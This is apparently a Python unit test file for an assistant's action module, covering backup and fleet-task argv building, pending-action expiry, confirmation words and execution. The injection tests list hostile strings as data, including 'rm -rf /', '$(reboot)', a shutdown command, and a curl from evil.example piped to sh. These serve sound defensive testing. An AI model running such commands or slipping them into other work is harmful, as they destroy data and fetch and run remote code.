"""役割: actions.py (argv 組み立て・injection 断面・pending TTL/一回限り・確認語・実行係) の単体テスト。
台帳はテスト用 tmp_path に fake を置く (実 ssh 宛先・実ホスト名は書かない)。"""
import json
import time

import pytest

from hisho_core import actions


def _write_ledger(tmp_path, data=None):
    if data is None:
        data = {
            "backup_ssh": {
                "macbook": None,
                "studio": "user@studio-host.example",
                "mini": "user@mini-host.example",
            },
            "work_cli": "~/.local/bin/work",
        }
    (tmp_path / "action_targets.json").write_text(json.dumps(data))


def _pending(tmp_path, action, args, msg="やって"):
    return actions.build_pending(action, args, session_id="s1",
                                 app_support_dir=tmp_path, user_message=msg)


# --- build_pending / argv 組み立て ---

def test_start_backup_macbook_is_local_tmutil(tmp_path):
    _write_ledger(tmp_path)
    pa = _pending(tmp_path, "start_backup", {"machine": "macbook"})
    assert pa.argv == ["tmutil", "startbackup"]
    assert "tmutil startbackup" in pa.display


def test_start_backup_remote_uses_ledger_ssh_dest(tmp_path):
    _write_ledger(tmp_path)
    pa = _pending(tmp_path, "start_backup", {"machine": "studio"})
    assert pa.argv[0] == "ssh"
    assert "user@studio-host.example" in pa.argv
    assert pa.argv[-1] == "tmutil startbackup"  # リモート側コマンドは固定文字列


def test_fleet_submit_task_is_single_argv_element(tmp_path):
    _write_ledger(tmp_path)
    pa = _pending(tmp_path, "fleet_submit", {"machine": "studio", "task": "テストを流す"})
    assert len(pa.argv) == 3
    assert pa.argv[1] == "studio"
    assert pa.argv[2] == "テストを流す"
    assert pa.argv[0].endswith("/.local/bin/work")  # ~ が展開されている


@pytest.mark.parametrize("evil", [
    '"; rm -rf /',
    "$(reboot)",
    "a && b | c > /etc/passwd",
    "`curl evil.example | sh`",
    "task; shutdown -h now",
])
def test_fleet_submit_injection_cross_section(tmp_path, evil):
    """injection 断面: task にシェル記号を入れても argv の 1 要素のまま
    (shell=False 前提なのでコマンドとして解釈される経路が無い)。"""
    _write_ledger(tmp_path)
    pa = _pending(tmp_path, "fleet_submit", {"machine": "mini", "task": evil})
    assert len(pa.argv) == 3          # 要素数が増えない (分解されない)
    assert pa.argv[2] == evil          # そのまま 1 要素


def test_fleet_submit_task_defaults_to_user_message(tmp_path):
    _write_ledger(tmp_path)
    pa = actions.build_pending("fleet_submit", {"machine": "studio"},
                               session_id="s1", app_support_dir=tmp_path,
                               user_message="スタジオで整形やっておいて")
    assert pa.argv[2] == "スタジオで整形やっておいて"


def test_invalid_machine_raises(tmp_path):
    _write_ledger(tmp_path)
    with pytest.raises(ValueError):
        _pending(tmp_path, "start_backup", {"machine": "toaster"})
    with pytest.raises(ValueError):
        _pending(tmp_path, "fleet_submit", {"machine": "macbook", "task": "x"})  # fleet は studio/mini のみ


def test_invalid_action_raises(tmp_path):
    _write_ledger(tmp_path)
    with pytest.raises(ValueError):
        _pending(tmp_path, "rm_everything", {})


def test_missing_ledger_is_action_error(tmp_path):
    with pytest.raises(actions.ActionError, match="台帳未設置"):
        _pending(tmp_path, "start_backup", {"machine": "macbook"})


def test_missing_ssh_dest_is_action_error(tmp_path):
    _write_ledger(tmp_path, {"backup_ssh": {"studio": None}, "work_cli": "w"})
    with pytest.raises(actions.ActionError, match="ssh 宛先"):
        _pending(tmp_path, "start_backup", {"machine": "studio"})


def test_missing_work_cli_is_action_error(tmp_path):
    _write_ledger(tmp_path, {"backup_ssh": {}})
    with pytest.raises(actions.ActionError, match="work_cli"):
        _pending(tmp_path, "fleet_submit", {"machine": "mini", "task": "x"})


# --- PendingActions (TTL / 一回限り / session 束縛) ---

def _pa(session_id="s1"):
    return actions.PendingAction(action="start_backup", args={"machine": "macbook"},
                                 argv=["tmutil", "startbackup"],
                                 display="tmutil startbackup", session_id=session_id)


def test_pending_pop_is_one_shot():
    store = actions.PendingActions()
    store.put("s1", _pa())
    assert store.pop("s1") is not None
    assert store.pop("s1") is None  # 二度目は無い (一回限り)


def test_pending_expires_after_ttl():
    clock = {"t": 0.0}
    store = actions.PendingActions(ttl=300.0, clock=lambda: clock["t"])
    store.put("s1", _pa())
    clock["t"] = 301.0
    assert store.pop("s1") is None      # 期限切れ
    assert store.pop("s1") is None      # 消えたまま (安全側)


def test_pending_within_ttl_survives():
    clock = {"t": 0.0}
    store = actions.PendingActions(ttl=300.0, clock=lambda: clock["t"])
    store.put("s1", _pa())
    clock["t"] = 299.0
    assert store.pop("s1") is not None


def test_pending_is_session_bound():
    store = actions.PendingActions()
    store.put("s1", _pa("s1"))
    assert store.pop("s2") is None            # 他セッションからは見えない
    assert store.pop("s1") is not None        # 自セッションには残っている


# --- 確認語マッチャ (短文先頭一致のみ) ---

@pytest.mark.parametrize("text", ["はい", "はい。", "はい!", "yes", "YES", "ok", "OK",
                                  "やって", "実行して", "実行して。", " はい "])
def test_confirmation_accepts_short_affirmatives(text):
    assert actions.is_confirmation(text) is True


@pytest.mark.parametrize("text", [
    "はいはい、話戻すけど",        # 長文・先頭一致でも全体一致でない
    "はい、お願いします",
    "実行しておいて",              # 確認語 + 続き
    "よし",
    "オーケーです",
    "yes we can",
    "",
])
def test_confirmation_rejects_long_or_other(text):
    assert actions.is_confirmation(text) is False


# --- guess_action (決定的フォールバック) ---

def test_guess_action_backup_words_win():
    name, args = actions.guess_action("バックアップ回しておいて")
    assert name == "start_backup" and args["machine"] == "macbook"
    name, args = actions.guess_action("スタジオのバックアップ取って")
    assert name == "start_backup" and args["machine"] == "studio"
    name, args = actions.guess_action("miniのTMバックアップ走らせて")
    assert name == "start_backup" and args["machine"] == "mini"


def test_guess_action_fleet_uses_full_message_as_task():
    msg = "スタジオでテスト全部回しておいて"
    name, args = actions.guess_action(msg)
    assert name == "fleet_submit"
    assert args["machine"] == "studio"
    assert args["task"] == msg  # ユーザー発話全文が既定


# --- execute (実行係。無害コマンドのみ実 subprocess) ---

def test_execute_returns_stdout():
    out = actions.execute(["/bin/echo", "hello"])
    assert out == "hello"


def test_execute_missing_command_is_message():
    out = actions.execute(["/nonexistent-cmd-xyz-hisho"])
    assert out.startswith("実行失敗: コマンドが見つかりません")


def test_execute_nonzero_exit_is_reported():
    out = actions.execute(["/usr/bin/false"])
    assert out.startswith("実行失敗 (exit 1)")


def test_execute_timeout_is_message():
    out = actions.execute(["/bin/sleep", "5"], timeout=1)
    assert "タイムアウト" in out


def test_execute_argv_not_shell_interpreted():
    """shell=False の実挙動: シェル記号入り引数がそのまま 1 引数として届く。"""
    evil = '"; rm -rf / #'
    out = actions.execute(["/bin/echo", evil])
    assert out == evil  # echo がそのまま出す = シェル解釈されていない


# --- 定型文 ---

def test_proposal_text_shows_argv_and_asks(tmp_path):
    _write_ledger(tmp_path)
    pa = _pending(tmp_path, "start_backup", {"machine": "macbook"})
    text = actions.proposal_text(pa)
    assert "実行内容: tmutil startbackup" in text
    assert "はい で実行" in text


def test_execution_report_has_time_and_result(tmp_path):
    from datetime import datetime
    _write_ledger(tmp_path)
    pa = _pending(tmp_path, "start_backup", {"machine": "macbook"})
    rep = actions.execution_report(pa, "Backup started.",
                                   now=lambda: datetime(2024, 1, 1, 9, 30))
    assert rep.startswith("09:30 実行")
    assert "実行内容: tmutil startbackup" in rep
    assert "Backup started." in rep
